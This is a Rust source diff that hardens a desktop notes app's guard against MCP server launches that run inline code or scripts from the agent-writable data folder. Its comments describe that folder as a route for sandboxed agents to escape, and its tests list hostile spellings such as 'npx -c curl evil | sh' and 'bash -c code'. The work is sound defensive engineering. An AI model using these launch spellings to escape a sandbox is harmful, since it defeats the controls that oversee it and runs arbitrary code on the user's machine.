@@ -110,17 +110,6 @@ fn is_interpreter_inline_flag(interpreter: &str, arg: &str) -> bool {
     }
 }
 
-/// `deno eval <code>` (a subcommand, not a flag) and `deno run -`, which
-/// reads the program from stdin.
-fn is_deno_inline_subcommand(rest: &[String]) -> bool {
-    let mut positional = rest.iter().filter(|a| !a.starts_with('-') || a.as_str() == "-");
-    match positional.next().map(|s| s.as_str()) {
-        Some("eval") => true,
-        Some("run") => rest.iter().any(|a| a == "-"),
-        _ => false,
-    }
-}
-
 /// Normalize a command/arg token to its lowercase basename without `.exe`, so
 /// `/opt/homebrew/bin/python3` and `NODE.EXE` match the denylists.
 fn basename_of(token: &str) -> String {
@@ -132,37 +121,308 @@ fn basename_of(token: &str) -> String {
     raw.strip_suffix(".exe").unwrap_or(&raw).to_string()
 }
 
-/// True if the token sequence contains an inline-code interpreter paired with an
-/// inline-eval flag anywhere after it. `awk`/`gawk`/`mawk` are treated as
-/// self-evaluating: any non-flag program argument counts (they have no `-c`).
-fn has_inline_code_invocation(tokens: &[String]) -> Option<String> {
-    for (i, tok) in tokens.iter().enumerate() {
-        let base = basename_of(tok);
-        if !INLINE_CODE_INTERPRETERS.contains(&base.as_str()) {
-            continue;
-        }
-        let rest = &tokens[i + 1..];
-        let self_evaluating = matches!(base.as_str(), "awk" | "gawk" | "mawk");
-        let inline = if self_evaluating {
-            // awk PROGRAM: the first non-flag token is code.
-            rest.iter().any(|a| !a.starts_with('-'))
-        } else {
-            rest.iter()
-                .any(|a| is_inline_code_flag(a) || is_interpreter_inline_flag(&base, a))
-                || (base == "deno" && is_deno_inline_subcommand(rest))
-        };
-        if inline {
-            return Some(base);
-        }
+/// Package runners: they run the FIRST positional argument as a program
+/// (`npx <pkg>`, `uvx <tool>`, `uv run <program>`), and everything after it
+/// belongs to that program. Unlike the exec wrappers above, their own options
+/// are well known, so the program can be located instead of guessed at.
+const LAUNCHERS: &[&str] = &["npx", "pnpx", "bunx", "uvx", "uv", "pnpm", "yarn", "npm", "pipx"];
+
+/// Sub-command words a launcher takes before the program (`uv run`,
+/// `uv tool run`, `pnpm dlx`). Empty for launchers that take the program
+/// directly. A launcher invoked with any other sub-command (`uv pip …`,
+/// `npm install`) is not running a program of ours to inspect.
+fn launcher_subcommands(launcher: &str) -> &'static [&'static str] {
+    match launcher {
+        "uv" => &["run", "tool", "x"],
+        "pnpm" | "yarn" => &["dlx", "exec"],
+        "npm" => &["exec", "x"],
+        "pipx" => &["run"],
+        _ => &[],
     }
-    None
 }
 
-/// Lexically resolve `token` (leading `~`, `.` and `..`) against `home`.
+/// Launcher options known to take no value, so the argument after one is
+/// certainly not that option's value. An option that is not listed is assumed
+/// to take one.
+const LAUNCHER_BOOLEAN_FLAGS: &[&str] = &[
+    "-y", "--yes", "-q", "--quiet", "--no", "--no-install", "--silent", "--bun", "--isolated",
+    "--offline", "--no-project", "--frozen", "--locked", "--no-sync", "--no-cache", "--refresh",
+    "-v", "--verbose", "--prefer-offline",
+];
+
+fn is_interpreter(basename: &str) -> bool {
+    INLINE_CODE_INTERPRETERS.contains(&basename)
+}
+
+/// True if `option` (a token starting with `-`) certainly takes no separate
+/// value, i.e. the next token is not its argument. Anything this does not
+/// recognise is treated as "might take a value": the token after it is then
+/// not assumed to be the script, which errs on the side of scanning further.
+fn option_takes_no_value(interpreter: &str, option: &str) -> bool {
+    // `--name=value` carries its value.
+    if option.contains('=') {
+        return true;
+    }
+    let cluster_within = |allowed: &str| {
+        short_cluster(option).is_some_and(|letters| letters.chars().all(|c| allowed.contains(c)))
+    };
+    match interpreter {
+        "node" | "nodejs" | "bun" | "deno" => {
+            matches!(
+                option,
+                "--enable-source-maps"
+                    | "--harmony"
+                    | "--trace-warnings"
+                    | "--trace-deprecation"
+                    | "--preserve-symlinks"
+                    | "--preserve-symlinks-main"
+                    | "--experimental-strip-types"
+                    | "--experimental-transform-types"
+                    | "--experimental-vm-modules"
+                    | "--expose-gc"
+                    | "--pending-deprecation"
+                    | "--throw-deprecation"
+                    | "--quiet"
+                    | "-q"
+                    | "-A"
+                    | "--smol"
+                    | "--bun"
+                    | "--cached-only"
+                    | "--no-check"
+                    | "--no-prompt"
+            ) || option.starts_with("--no-")
+                // Deno permission flags take a value only with `=`.
+                || option.starts_with("--allow-")
+                || option.starts_with("--deny-")
+                || option.starts_with("--unstable")
+        }
+        "python" | "python2" | "python3" => cluster_within("bBdEiIOPqRsSuvx"),
+        "sh" | "bash" | "zsh" | "dash" | "ksh" | "ash" | "fish" => {
+            // No `c` (inline code) and no `o` (takes an option name).
+            cluster_within("abefhiklmnprtuvxBCDEHPT")
+                || matches!(
+                    option,
+                    "--login" | "--norc" | "--noprofile" | "--posix" | "--restricted" | "--verbose"
+                )
+        }
+        "perl" | "ruby" | "php" | "rscript" => {
+            // `-MPOSIX`, `-I/opt/lib`, `-rset`: the value is attached.
+            let attached = option.len() > 2
+                && ["-I", "-M", "-m", "-r"].iter().any(|p| option.starts_with(p))
+                && !option.starts_with("--");
+            attached || cluster_within("wWtTsSUuXv") || matches!(option, "--vanilla" | "--verbose")
+        }
+        _ => false,
+    }
+}
+
+/// True if `interpreter`, called with `rest`, is told to evaluate code from
+/// the command line.
+///
+/// Only the interpreter's OWN options are examined: scanning stops at the
+/// script (the first positional argument, or `python -m <module>`), because
+/// everything after that is the script's argument list — `node server.js -e
+/// production` and `python3 server.py -c config.json` hand `-e`/`-c` to the
+/// server, not to the interpreter. A positional that directly follows an
+/// option which might take a value (`node --require <x> …`) is not assumed to
+/// be the script, so an unknown value-taking option cannot be used to end the
+/// scan early.
+///
+/// `awk`/`gawk`/`mawk` are self-evaluating: any non-flag argument is the
+/// program text (they have no `-c`).
+fn interpreter_runs_inline_code(interpreter: &str, rest: &[String]) -> bool {
+    if matches!(interpreter, "awk" | "gawk" | "mawk") {
+        return rest.iter().any(|a| !a.starts_with('-'));
+    }
+    // `deno run …` / `bun run …`: one sub-command word before the script.
+    let subcommands: &[&str] = match interpreter {
+        "deno" | "bun" => &["run"],
+        _ => &[],
+    };
+    let is_python = matches!(interpreter, "python" | "python2" | "python3");
+    let mut ran_subcommand = false;
+    let mut after_value_option = false;
+
+    for arg in rest {
+        let a = arg.trim();
+        if a == "--" {
+            // End of options: what follows is the script and its arguments.
+            return false;
+        }
+        // Checked on every token up to and including the script position:
+        // a `data:` URL is code whether it is `--import`'s value or stands
+        // where the script would.
+        if is_inline_code_flag(a) || is_interpreter_inline_flag(interpreter, a) {
+            return true;
+        }
+        if a.starts_with('-') && a != "-" {
+            // `python -m <module>`: the module is the program.
+            if is_python
+                && (a.starts_with("-m") || short_cluster(a).is_some_and(|l| l.contains('m')))
+            {
+                return false;
+            }
+            after_value_option = !option_takes_no_value(interpreter, a);
+            continue;
+        }
+
+        // A positional argument (or a bare `-`).
+        if !ran_subcommand {
+            // `deno eval <code>` is a sub-command, not a flag.
+            if interpreter == "deno" && a == "eval" {
+                return true;
+            }
+            if subcommands.contains(&a) {
+                ran_subcommand = true;
+                after_value_option = false;
+                continue;
+            }
+        }
+        if a == "-" {
+            // `deno run -` / `bun run -` read the program from stdin.
+            return ran_subcommand;
+        }
+        if after_value_option {
+            // Possibly the previous option's value rather than the script.
+            after_value_option = false;
+            continue;
+        }
+        return false;
+    }
+    false
+}
+
+/// The arguments of `launcher` that may be the program it runs: the first
+/// positional, plus any earlier positional that directly follows an option
+/// which might take a value (it may be that option's value instead). Returned
+/// as indices into `args`. `None` when the launcher itself is told to run
+/// inline code (`npx -c "<shell command>"`).
+fn launcher_programs(launcher: &str, args: &[String]) -> Option<Vec<usize>> {
+    let subcommands = launcher_subcommands(launcher);
+    let runs_shell_string = matches!(launcher, "npx" | "pnpx" | "npm");
+    let mut need_subcommand = !subcommands.is_empty();
+    let mut after_value_option = false;
+    let mut candidates = Vec::new();
+
+    for (i, arg) in args.iter().enumerate() {
+        let a = arg.trim();
+        if a == "--" {
+            if !need_subcommand && i + 1 < args.len() {
+                candidates.push(i + 1);
+            }
+            break;
+        }
+        if a.starts_with('-') && a != "-" {
+            // `npx -c '<command>'` / `--call` runs its value through a shell.
+            let long = a.split_once('=').map_or(a, |(name, _)| name);
+            if runs_shell_string && (a == "-c" || long == "--call") {
+                return None;
+            }
+            after_value_option = !(a.contains('=') || LAUNCHER_BOOLEAN_FLAGS.contains(&a));
+            continue;
+        }
+        if need_subcommand && candidates.is_empty() && subcommands.contains(&a) {
+            // `uv tool run`: more than one word may precede the program.
+            need_subcommand = subcommands.contains(&"tool") && a == "tool";
+            after_value_option = false;
+            continue;
+        }
+        if need_subcommand {
+            if after_value_option {
+                after_value_option = false;
+                continue;
+            }
+            // Some other sub-command (`uv pip`, `npm install`): no program.
+            break;
+        }
+        candidates.push(i);
+        if !after_value_option {
+            break;
+        }
+        after_value_option = false;
+    }
+    Some(candidates)
+}
+
+/// How many levels of `env npx uv run …` nesting are followed.
+const MAX_WRAPPER_DEPTH: usize = 4;
+
+/// True if `token` is an absolute path that is not a file: a directory, or
+/// nothing at all. Such an argument cannot be the program a wrapper runs, so
+/// a folder that happens to be called `awk` or `node`
+/// (`server-filesystem /Users/me/dev/awk`) is not mistaken for one.
+fn cannot_be_a_program(token: &str) -> bool {
+    let path = std::path::Path::new(token.trim());
+    path.is_absolute() && !path.is_file()
+}
+
+/// Any interpreter named in `tokens` that is told to run inline code. Used
+/// where the program cannot be located reliably: after an exec wrapper
+/// (`xargs -I {} bash -c …`, `nice -n 10 perl -e …`), after a command this
+/// guard does not know, or among the arguments of a program that may itself
+/// run them (`npx cross-env X=1 bash -c …`). Each interpreter is still judged
+/// on its own options only.
+fn nested_inline_code(tokens: &[String]) -> Option<String> {
+    tokens.iter().enumerate().find_map(|(i, tok)| {
+        let base = basename_of(tok);
+        (is_interpreter(&base)
+            && !cannot_be_a_program(tok)
+            && interpreter_runs_inline_code(&base, &tokens[i + 1..]))
+        .then_some(base)
+    })
+}
+
+/// The interpreter (or launcher) that `tokens` — a command and its arguments —
+/// asks to run code given on the command line, if any.
+fn has_inline_code_invocation(tokens: &[String]) -> Option<String> {
+    inline_code_invocation(tokens, 0)
+}
+
+fn inline_code_invocation(tokens: &[String], depth: usize) -> Option<String> {
+    let (command, rest) = tokens.split_first()?;
+    let base = basename_of(command);
+    if depth >= MAX_WRAPPER_DEPTH {
+        return nested_inline_code(tokens);
+    }
+    if is_interpreter(&base) {
+        return interpreter_runs_inline_code(&base, rest).then_some(base);
+    }
+    if LAUNCHERS.contains(&base.as_str()) {
+        let Some(programs) = launcher_programs(&base, rest) else {
+            return Some(base);
+        };
+        // The program a launcher runs is judged like a command of its own.
+        return programs
+            .into_iter()
+            .find_map(|i| inline_code_invocation(&rest[i..], depth + 1));
+    }
+    // An exec wrapper, or a command this guard does not know.
+    nested_inline_code(rest)
+}
+
+/// `~` → `home`, `~/x` → `home/x`; anything else unchanged. Only a leading
+/// `~/` is expanded (no `~user`, no `$VAR`): the spawn does not go through a
+/// shell, so this is the one expansion a hand-written config needs.
+pub(crate) fn expand_tilde(token: &str, home: &std::path::Path) -> String {
+    if token == "~" {
+        home.to_string_lossy().into_owned()
+    } else if let Some(rest) = token.strip_prefix("~/") {
+        home.join(rest).to_string_lossy().into_owned()
+    } else {
+        token.to_string()
+    }
+}
+
+/// Lexically resolve `token` (leading `~`, `.` and `..`) against `home`, and
+/// a relative path against `cwd` (where the server will be started).
 /// `None` for a bare program name, which is looked up on `PATH` and so is
 /// never a path into the app's data folder.
-fn resolve_command_path(token: &str, home: &std::path::Path) -> Option<std::path::PathBuf> {
-    use std::path::{Component, PathBuf};
+fn resolve_command_path(
+    token: &str,
+    home: &std::path::Path,
+    cwd: &std::path::Path,
+) -> Option<std::path::PathBuf> {
+    use std::path::PathBuf;
     let token = token.trim();
     let expanded = if token == "~" {
         home.to_path_buf()
@@ -173,8 +433,14 @@ fn resolve_command_path(token: &str, home: &std::path::Path) -> Option<std::path
     } else {
         return None;
     };
+    Some(normalize_lexically(&cwd.join(expanded)))
+}
+
+/// Resolve `.` and `..` without touching the filesystem.
+fn normalize_lexically(path: &std::path::Path) -> std::path::PathBuf {
+    use std::path::{Component, PathBuf};
     let mut out = PathBuf::new();
-    for component in expanded.components() {
+    for component in path.components() {
         match component {
             Component::ParentDir => {
                 out.pop();
@@ -183,45 +449,86 @@ fn resolve_command_path(token: &str, home: &std::path::Path) -> Option<std::path
             other => out.push(other.as_os_str()),
         }
     }
-    Some(out)
+    out
 }
 
-/// True if `token` names a file inside `data_dir` (the app's `~/.notesage`),
-/// either as written or after following symlinks.
-fn points_into(token: &str, home: &std::path::Path, data_dir: &std::path::Path) -> bool {
-    let Some(path) = resolve_command_path(token, home) else {
-        return false;
-    };
+/// True if `path` is inside `data_dir` (the app's `~/.notesage`), either as
+/// written or after following symlinks.
+fn path_is_inside(path: &std::path::Path, data_dir: &std::path::Path) -> bool {
     let real_data_dir = data_dir.canonicalize().unwrap_or_else(|_| data_dir.to_path_buf());
     let inside = |p: &std::path::Path| p.starts_with(data_dir) || p.starts_with(&real_data_dir);
-    inside(&path) || path.canonicalize().is_ok_and(|real| inside(&real))
+    inside(path) || path.canonicalize().is_ok_and(|real| inside(&real))
 }
 
 /// The program an interpreter or wrapper is asked to run from a FILE: the
 /// first argument that is not an option (`node <script>`, `env <program>`).
-fn first_positional(args: &[String]) -> Option<&String> {
-    args.iter().find(|a| !a.starts_with('-') && !a.contains('='))
+fn first_positional(args: &[String]) -> Option<usize> {
+    args.iter().position(|a| !a.starts_with('-') && !a.contains('='))
+}
+
+/// The tokens of a launch that name code to run: the command, the script an
+/// interpreter is given, and the same again for whatever a wrapper or
+/// launcher runs (`env node <script>`, `uv run python <script>`).
+fn launched_code_tokens<'a>(tokens: &'a [String], depth: usize, out: &mut Vec<&'a str>) {
+    let Some((command, rest)) = tokens.split_first() else {
+        return;
+    };
+    out.push(command.as_str());
+    if depth >= MAX_WRAPPER_DEPTH {
+        return;
+    }
+    let base = basename_of(command);
+    if is_interpreter(&base) {
+        if let Some(i) = first_positional(rest) {
+            out.push(rest[i].as_str());
+        }
+    } else if EXEC_WRAPPERS.contains(&base.as_str()) {
+        if let Some(i) = first_positional(rest) {
+            launched_code_tokens(&rest[i..], depth + 1, out);
+        }
+    } else if LAUNCHERS.contains(&base.as_str()) {
+        for i in launcher_programs(&base, rest).unwrap_or_default() {
+            launched_code_tokens(&rest[i..], depth + 1, out);
+        }
+    }
 }
 
 /// Reject a launch whose program, or the script handed to an interpreter or
-/// exec wrapper, lives in the app's own data folder. `~/.notesage` is the one
+/// exec wrapper, lives in the app's own data folder — or which is started
+/// with that folder as its working directory. `~/.notesage` is the one
 /// home directory a sandboxed agent may always write, so a file there is not
 /// something the user installed: `command: "~/.notesage/x.sh"` and
 /// `command: "bash", args: ["~/.notesage/x.sh"]` are the inline-code escape
 /// with the code moved into a file.
+///
+/// `cwd` is where the server will be started; relative paths are resolved
+/// against it, so `cwd: "~", args: [".notesage/x.sh"]` is caught as well.
 fn validate_not_in_data_dir(
     command: &str,
     args: &[String],
     home: &std::path::Path,
+    cwd: &std::path::Path,
 ) -> Result<(), String> {
     let data_dir = home.join(".notesage");
-    let basename = basename_of(command);
-    let runs_its_argument = INLINE_CODE_INTERPRETERS.contains(&basename.as_str())
-        || EXEC_WRAPPERS.contains(&basename.as_str());
-    let script = if runs_its_argument { first_positional(args) } else { None };
+    let cwd = normalize_lexically(&home.join(cwd));
+    if path_is_inside(&cwd, &data_dir) {
+        return Err(format!(
+            "Refusing to launch MCP server: its working directory '{}' is inside Notesage's own data folder ({}), which agents can write to. Use a different folder.",
+            cwd.display(),
+            data_dir.display()
+        ));
+    }
 
-    for token in std::iter::once(command).chain(script.map(|s| s.as_str())) {
-        if points_into(token, home, &data_dir) {
+    let mut all = Vec::with_capacity(args.len() + 1);
+    all.push(command.to_string());
+    all.extend_from_slice(args);
+    let mut tokens = Vec::new();
+    launched_code_tokens(&all, 0, &mut tokens);
+
+    for token in tokens {
+        let inside = resolve_command_path(token, home, &cwd)
+            .is_some_and(|path| path_is_inside(&path, &data_dir));
+        if inside {
             return Err(format!(
                 "Refusing to launch MCP server: '{}' is inside Notesage's own data folder ({}), which agents can write to. Install the server somewhere else.",
                 token,
@@ -237,35 +544,39 @@ fn validate_not_in_data_dir(
 /// servers spawn from `command`/`args` taken verbatim from `mcp.json` — and
 /// `~/.notesage/mcp.json` is writable by sandboxed agents, so
 /// `command:"bash", args:["-c","…"]` is a sandbox-escape primitive. The guard
-/// also looks through exec wrappers (`env`/`xargs`/`nohup`/… bash -c …) so a
-/// wrapper binary can't smuggle the same payload past a basename-only check.
+/// also looks through exec wrappers (`env`/`xargs`/`nohup`/… bash -c …) and
+/// package runners (`uv run python -c …`) so a wrapper binary can't smuggle
+/// the same payload past a basename-only check.
 /// Legitimate servers invoke a launcher (`npx`, `uvx`, `node server.js`,
 /// `python -m pkg`) which never pairs an interpreter with an inline-eval flag,
-/// so this guard stays surgical.
+/// so this guard stays surgical: an interpreter is judged on its own options
+/// only, never on the arguments of the script it runs.
 ///
 /// This is a filter on the obvious spellings, not a sandbox: the server still
 /// runs unconfined, and a script an agent wrote into a project folder is not
 /// caught here.
-pub fn validate_mcp_command(command: &str, args: &[String]) -> Result<(), String> {
-    let basename = basename_of(command);
-
+///
+/// `cwd` is where the server will be started (`None`: the user's home
+/// directory, the default). `command`, `args` and `cwd` may be given with or
+/// without their leading `~` expanded; the check is the same either way.
+pub(crate) fn validate_mcp_command(
+    command: &str,
+    args: &[String],
+    cwd: Option<&std::path::Path>,
+) -> Result<(), String> {
     if let Some(home) = dirs::home_dir() {
-        validate_not_in_data_dir(command, args, &home)?;
+        let cwd = match cwd {
+            Some(cwd) => std::path::PathBuf::from(expand_tilde(&cwd.to_string_lossy(), &home)),
+            None => home.clone(),
+        };
+        validate_not_in_data_dir(command, args, &home, &cwd)?;
     }
 
-    // Build the token stream the guard scans. When `command` is an exec
-    // wrapper, the real program is somewhere in `args`, so scan args for a
-    // nested interpreter. Otherwise scan `[command, ...args]` directly.
-    let flagged = if EXEC_WRAPPERS.contains(&basename.as_str()) {
-        has_inline_code_invocation(args)
-    } else {
-        let mut all = Vec::with_capacity(args.len() + 1);
-        all.push(command.to_string());
-        all.extend_from_slice(args);
-        has_inline_code_invocation(&all)
-    };
+    let mut all = Vec::with_capacity(args.len() + 1);
+    all.push(command.to_string());
+    all.extend_from_slice(args);
 
-    if let Some(interpreter) = flagged {
+    if let Some(interpreter) = has_inline_code_invocation(&all) {
         return Err(format!(
             "Refusing to launch MCP server: '{}' with an inline-code flag (e.g. -c/-e/--eval) runs arbitrary commands. Point the server at a script file or a launcher (npx/uvx) instead.",
             interpreter
@@ -274,20 +585,32 @@ pub fn validate_mcp_command(command: &str, args: &[String]) -> Result<(), String
     Ok(())
 }
 
-/// Overall budget for a validation dry run. Shorter than the reader loop's
-/// per-message timeout so a silent server fails fast instead of hanging the
-/// dialog.
-pub(crate) const MCP_VALIDATE_TIMEOUT: Duration = Duration::from_secs(20);
+/// Overall budget for a validation dry run. Two minutes, because the first
+/// run of an `npx -y …` / `uvx …` server downloads the package before it can
+/// answer, which on a cold cache routinely takes longer than the 20 s this
+/// used to be — and a failed test used to be a hard gate on saving.
+pub(crate) const MCP_VALIDATE_TIMEOUT: Duration = Duration::from_secs(120);
 
 /// Map an OS spawn failure to a stable `error_kind` + human-readable message.
 /// Pure so it can be unit-tested without a live process.
 pub(crate) fn map_spawn_error(err: &std::io::Error, command: &str) -> (&'static str, String) {
     if err.kind() == std::io::ErrorKind::NotFound {
+        // `npx -y some-server` typed into the command field is looked up as
+        // one program name. A path with a space in it is not that mistake.
+        let first_word = command.trim().split(' ').next().unwrap_or("");
+        let looks_like_a_command_line = command.trim().contains(' ')
+            && !first_word.contains('/')
+            && !first_word.contains(std::path::MAIN_SEPARATOR);
+        let hint = if looks_like_a_command_line {
+            " The command must be the program alone (for example 'npx'); put everything after it in the arguments."
+        } else {
+            ""
+        };
         (
             "binary_not_found",
             format!(
-                "Command not found: '{}'. Make sure it is installed and on your PATH.",
-                command
+                "Command not found: '{}'. Make sure it is installed and on your PATH.{}",
+                command, hint
             ),
         )
     } else {
@@ -310,32 +633,15 @@ pub(crate) fn validation_error(
     }
 }
 
-/// Drain the child's stderr and return the last ~20 lines (the child must
-/// already be killed/awaited, otherwise reading to EOF could block).
-pub(crate) async fn read_stderr_tail(
-    stderr: Option<tokio::process::ChildStderr>,
-) -> Option<String> {
-    use tokio::io::AsyncReadExt;
-    let mut stderr = stderr?;
-    let mut buf = Vec::new();
-    let _ = tokio::time::timeout(Duration::from_millis(500), stderr.read_to_end(&mut buf)).await;
-    if buf.is_empty() {
-        return None;
-    }
-    let text = String::from_utf8_lossy(&buf);
-    let lines: Vec<&str> = text.lines().collect();
-    let start = lines.len().saturating_sub(20);
-    let tail = lines[start..].join("\n");
-    if tail.trim().is_empty() {
-        None
-    } else {
-        Some(tail)
-    }
-}
-
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    /// The guard with the default working directory, which is what almost
+    /// every case here is about.
+    fn validate_mcp_command(command: &str, args: &[String]) -> Result<(), String> {
+        super::validate_mcp_command(command, args, None)
+    }
 
     // --- validate_mcp_command (security audit HIGH #1) ---
 
@@ -487,7 +793,7 @@ mod tests {
     fn rejects_programs_and_scripts_inside_the_data_folder() {
         let home = std::path::Path::new("/Users/someone");
         let reject = |command: &str, list: &[&str]| {
-            validate_not_in_data_dir(command, &args(list), home).is_err()
+            validate_not_in_data_dir(command, &args(list), home, home).is_err()
         };
         assert!(reject("/Users/someone/.notesage/evil.sh", &[]));
         assert!(reject("~/.notesage/bin/evil", &[]));
@@ -520,7 +826,257 @@ mod tests {
         std::os::unix::fs::symlink(data.join("evil.sh"), &link).unwrap();
 
         let command = link.to_string_lossy().to_string();
-        assert!(validate_not_in_data_dir(&command, &[], home.path()).is_err());
+        assert!(validate_not_in_data_dir(&command, &[], home.path(), home.path()).is_err());
+    }
+
+    // --- L4: an interpreter is judged on its own options only ---
+
+    /// Split a command line on spaces (none of the cases needs quoting,
+    /// except a trailing code argument, which is written without spaces).
+    fn launch(line: &str) -> Result<(), String> {
+        let mut tokens = line.split(' ').map(str::to_string);
+        let command = tokens.next().unwrap();
+        let rest: Vec<String> = tokens.collect();
+        validate_mcp_command(&command, &rest)
+    }
+
+    #[test]
+    fn allows_launches_whose_script_takes_flags_that_look_like_eval_flags() {
+        // Every one of these was rejected: the scan ran on into the script's
+        // own arguments and matched interpreter names on any argument.
+        let legitimate = [
+            "node server.js -p 8080",
+            "node server.js -e production",
+            "bun run server.ts -p 3000",
+            "python3 server.py -c config.json",
+            "python3 -m mod -c config.json",
+            "uv run python server.py -c cfg",
+            "docker run -i --rm --entrypoint node img -e X",
+            "npx -y server-filesystem /Users/me/dev/awk /Users/me/docs",
+            // More of the same family.
+            "node --enable-source-maps server.js -e production",
+            "node --import tsx server.ts -p 1",
+            "node -r dotenv/config server.js -e production",
+            "/opt/homebrew/bin/node /abs/server.js --eval-mode fast -c x",
+            "python3 -u server.py -c config.json",
+            "python3 -um my_mcp -c config.json",
+            "bash start.sh -c config",
+            "bash -l start.sh -c config",
+            "deno run --allow-net server.ts -e prod",
+            "bun server.ts -e prod",
+            "ruby server.rb -e prod",
+            "perl -MPOSIX server.pl -e prod",
+            "php server.php -r x",
+            "uvx mcp-server-git --repository /Users/me/dev/python",
+            "uv run --with requests server.py -c cfg",
+            "uv tool run mcp-server-fetch -c cfg",
+            "npx -y @modelcontextprotocol/server-filesystem /Users/me/bash /Users/me/node",
+            "some-server --root /Users/me/dev/awk /Users/me/docs",
+            "npx -y tsx server.ts -e prod",
+            "pnpm dlx some-mcp -c cfg",
+            "env FOO=1 node server.js -e production",
+            "docker run -i --rm -e API_KEY mcp/server",
+            "my-server -c config.json -e prod",
+        ];
+        for line in legitimate {
+            assert!(launch(line).is_ok(), "should be allowed: {line} -> {:?}", launch(line));
+        }
+    }
+
+    #[test]
+    fn still_rejects_every_inline_code_spelling() {
+        let rejected = [
+            // The list from the review, verbatim.
+            "node -e code",
+            "node -p code",
+            "node --eval=code",
+            "python -c code",
+            "perl -e code",
+            "perl -E code",
+            "php -r code",
+            "deno eval code",
+            "deno run -",
+            "bash -lc code",
+            "sh -c code",
+            "node --import data:text/javascript,code server.js",
+            "node --import=data:text/javascript,code server.js",
+            // An option that takes a value does not end the scan early.
+            "node -r fs -e code",
+            "node --require /usr/lib/node_modules/npm/index.js -e code",
+            "node --import tsx -e code",
+            "node --enable-source-maps -e code",
+            "node --title x --eval code",
+            "python3 -u -c code",
+            "python3 -W ignore -c code",
+            "python3 -X dev -c code",
+            "bash -o pipefail -c code",
+            "bash --norc -c code",
+            "bash --rcfile /etc/profile -c code",
+            "perl -MPOSIX -e code",
+            "perl -I /opt/lib -e code",
+            "ruby -r set -e code",
+            "deno --quiet eval code",
+            "deno run --allow-all -",
+            "bun run -",
+            "bun -e code",
+            "bun run -e code",
+            // Through launchers and wrappers.
+            "uv run python -c code",
+            "uv run --with requests python -c code",
+            "uv run --directory /srv python3 -c code",
+            "uv tool run python -c code",
+            "uvx --from pkg python -c code",
+            "npx -y node -e code",
+            "npx --package foo bash -c code",
+            "npx -c code",
+            "npx --call=code",
+            "pnpm exec node -e code",
+            "pipx run python -c code",
+            "env uv run python -c code",
+            "npx env bash -c code",
+            // A package that runs its own arguments.
+            "npx -y cross-env FOO=1 bash -c code",
+            "npx -y some-runner python3 -c code",
+            "uvx some-runner sh -c code",
+            "env -u python bash -c code",
+            "env FOO=1 node -e code",
+            "nice -n 10 perl -e code",
+            "xargs -I {} bash -c code",
+            "caffeinate -i bash -c code",
+            "some-unknown-wrapper python3 -c code",
+            // awk has no flag: the program text is the code.
+            "awk BEGIN{system(1)}",
+            "env awk BEGIN{system(1)}",
+        ];
+        for line in rejected {
+            assert!(launch(line).is_err(), "must stay rejected: {line}");
+        }
+    }
+
+    #[test]
+    fn a_folder_named_like_an_interpreter_is_not_one_but_a_file_is() {
+        let dir = tempfile::tempdir().unwrap();
+        let folder = dir.path().join("awk");
+        std::fs::create_dir_all(&folder).unwrap();
+        let folder = folder.to_string_lossy().to_string();
+        let docs = dir.path().to_string_lossy().to_string();
+        // A directory argument (the filesystem server's allowed folders).
+        assert!(validate_mcp_command("some-server", &[folder.clone(), docs.clone()]).is_ok());
+        assert!(validate_mcp_command("env", &["some-server".into(), folder, docs.clone()]).is_ok());
+        // A path that does not exist cannot be run either.
+        assert!(validate_mcp_command("some-server", &["/nonexistent/dev/awk".into(), docs.clone()]).is_ok());
+
+        // A real file of that name after a wrapper is a program.
+        let file = dir.path().join("gawk");
+        std::fs::write(&file, "#!/bin/sh\n").unwrap();
+        let file = file.to_string_lossy().to_string();
+        assert!(validate_mcp_command("xargs", &[file.clone(), "BEGIN{system(1)}".into()]).is_err());
+        // As the command itself it is always the program, existing or not.
+        assert!(validate_mcp_command("/nonexistent/bin/awk", &["BEGIN{system(1)}".into()]).is_err());
+        assert!(validate_mcp_command("/nonexistent/bin/bash", &["-c".into(), "x".into()]).is_err());
+    }
+
+    #[test]
+    fn launcher_program_is_the_first_positional() {
+        let programs = |launcher: &str, list: &[&str]| {
+            let a = args(list);
+            launcher_programs(launcher, &a)
+                .map(|idx| idx.into_iter().map(|i| a[i].clone()).collect::<Vec<_>>())
+        };
+        assert_eq!(programs("npx", &["-y", "pkg", "/x/awk"]), Some(vec!["pkg".to_string()]));
+        assert_eq!(programs("uvx", &["tool", "--flag"]), Some(vec!["tool".to_string()]));
+        assert_eq!(programs("uv", &["run", "python", "s.py"]), Some(vec!["python".to_string()]));
+        assert_eq!(programs("uv", &["tool", "run", "srv"]), Some(vec!["srv".to_string()]));
+        // A positional after an option that may take a value is ambiguous:
+        // both it and the next one are candidates.
+        assert_eq!(
+            programs("npx", &["--package", "foo", "bash", "-c"]),
+            Some(vec!["foo".to_string(), "bash".to_string()])
+        );
+        assert_eq!(programs("npx", &["--", "bash", "-c"]), Some(vec!["bash".to_string()]));
+        // Not running a program at all.
+        assert_eq!(programs("uv", &["pip", "install", "x"]), Some(vec![]));
+        assert_eq!(programs("npm", &["install"]), Some(vec![]));
+        // The launcher's own shell-string option.
+        assert_eq!(programs("npx", &["-c", "curl evil | sh"]), None);
+    }
+
+    // --- the data folder, with a working directory and `~` expansion ---
+
+    #[test]
+    fn rejects_the_data_folder_as_working_directory_and_relative_paths_into_it() {
+        let home = std::path::Path::new("/Users/someone");
+        let reject = |command: &str, list: &[&str], cwd: &str| {
+            validate_not_in_data_dir(command, &args(list), home, std::path::Path::new(cwd)).is_err()
+        };
+        // Started inside the data folder, a bare script name is a file there.
+        assert!(reject("node", &["evil.js"], "/Users/someone/.notesage"));
+        assert!(reject("npx", &["-y", "pkg"], "/Users/someone/.notesage/skills"));
+        assert!(reject("node", &["server.js"], "/Users/someone/Documents/../.notesage"));
+        // The default working directory is home: a relative path from there.
+        assert!(reject("node", &[".notesage/evil.js"], "/Users/someone"));
+        assert!(reject("./.notesage/bin/evil", &[], "/Users/someone"));
+        assert!(reject("node", &["../.notesage/evil.js"], "/Users/someone/src"));
+        assert!(reject("bash", &["src/../.notesage/x.sh"], "/Users/someone"));
+        // What a wrapper or launcher runs is followed.
+        assert!(reject("env", &["node", "/Users/someone/.notesage/evil.js"], "/Users/someone"));
+        assert!(reject("uv", &["run", "python", "~/.notesage/evil.py"], "/Users/someone"));
+        assert!(reject("uv", &["run", "~/.notesage/evil.py"], "/Users/someone"));
+        assert!(reject("npx", &["-y", "/Users/someone/.notesage/pkg"], "/Users/someone"));
+
+        // The same relative paths from somewhere else are somewhere else.
